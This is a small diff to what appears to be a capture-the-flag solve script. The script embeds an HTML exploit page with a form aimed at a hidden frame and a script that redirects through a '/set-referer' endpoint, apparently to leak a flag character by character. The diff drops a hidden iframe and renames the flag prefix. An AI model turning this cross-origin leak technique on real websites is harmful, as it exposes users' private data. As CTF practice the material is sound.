@@ -20,7 +20,6 @@ EXPLOIT_PAGE = """<!doctype html>
     <form method="post" target="p">
         <input type="text" name="content">
     </form>
-    <iframe name="p" hidden></iframe>
     <script>
         const TARGET = {{ target_url | tojson }};
         const REDIRECTED_URL = `${location.origin}/set-referer`;
@@ -145,7 +144,7 @@ def parse_args() -> argparse.Namespace:
     )
     parser.add_argument(
         "--known-prefix",
-        default="FINDIT{",
+        default="FindITCTF{",
         help="Known flag prefix",
     )
     parser.add_argument(
